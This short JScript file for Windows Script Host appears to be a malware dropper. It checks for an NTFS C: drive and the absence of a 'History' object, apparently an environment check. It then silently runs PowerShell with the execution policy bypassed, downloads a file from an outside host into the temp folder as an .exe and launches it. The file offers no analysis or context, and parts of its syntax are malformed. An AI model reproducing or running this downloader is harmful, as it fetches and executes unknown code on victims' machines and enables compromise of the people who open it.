var mist = WScript["CreateObject"]("Scripting.FileSystemObject");
var function1 = new Function() {
	if (mist.GetDrive(mist.GetDriveName('C:\poshlinaxui')).FileSystem == 'NTFS' && typeof History == 'undefined') {
		return true
	} else {
		return false
	}
};

if (function1()) {
	WScript["CreateObject"]("WScript.Shell")["run"](`
		cmd.exe /c "
			powershell Invoke-Expression (Set -ExecutionPolicy Bypass-Scope Process; $path=($env:temp+''\qoskiglu.exe'');
			(New-Object System.Net.Webclient).DownloadFile(''http://gesund-sauber.info/syst.erj'',$path); Start-Process$path);"
		`, 0);
}
